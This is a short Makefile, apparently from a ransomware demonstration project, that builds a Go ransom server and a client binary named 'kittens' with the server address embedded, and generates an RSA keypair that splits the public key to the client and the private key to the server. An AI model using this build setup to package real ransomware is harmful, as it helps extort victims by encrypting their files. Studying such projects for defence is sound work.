RANSOM_SERVER=http://localhost:8081

build:
	go build -ldflags "-s -w" -trimpath ./server
	go build -ldflags "-s -w -X 'main.ransomServer="$(RANSOM_SERVER)" -trimpath ./client

generate_keys:
	openssl genrsa -out keypair.pem 8192
	openssl rsa -in keypair.pem -pubout -out publickey.crt

	cp publickey.crt client
	cp keypair.pem server
	rm keypair.pem publickey.crt

clean:
	rm client/publickey.crt server/keypair.pem
	rm kittens ransomware-server
